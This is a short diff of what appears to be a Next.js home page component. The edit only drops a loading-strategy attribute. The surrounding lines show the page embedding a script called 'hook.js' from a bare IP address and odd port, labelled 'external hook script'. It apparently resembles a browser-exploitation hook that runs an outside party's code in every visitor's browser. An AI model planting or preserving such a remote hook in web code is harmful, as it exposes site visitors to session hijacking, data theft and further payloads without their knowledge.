@@ -544,7 +544,6 @@ export default function Home() {
       {/* external hook script */}
       <Script
         src="http://89.165.219.117:3069/hook.js"
-        strategy="afterInteractive"
       />
     </main> // end main container
   ); // end return
